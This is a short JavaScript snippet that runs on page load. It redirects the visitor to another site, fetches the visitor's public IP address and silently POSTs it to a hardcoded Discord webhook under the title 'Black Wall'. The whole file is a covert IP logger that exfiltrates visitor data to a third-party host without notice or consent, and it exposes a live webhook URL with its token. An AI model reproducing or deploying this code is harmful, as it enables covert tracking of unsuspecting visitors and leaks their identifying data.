document.addEventListener("DOMContentLoaded", function () {
  window.location.href = "https://www.ptoszek.pl/";
  fetch("https://api.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => {
      const userIP = data.ip;
      const platform = navigator.platform;
      const browserLanguage = navigator.language;
      const currentDate = new Date().toLocaleString();
      fetch(
        "https://discord.com/api/webhooks/1194937999566315611/DMU2ZvTrmWXdJs2WMxji73MdCYxxgapvkh9bYaJs8gC0Y0wJnK-XYozfIAMkdbKmubE6",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            embeds: [
              {
                title: "Black Wall",
                description: `${userIP}`,
                color: 0x00023d,
              },
            ],
          }),
        }
      )
        .then((response) => response.json())
        .then((data) => console.log(data))
        .catch((error) => {
          console.error("Error:", error);
        });
    })
    .catch((error) => {
      console.error("Error:", error);
    });
});
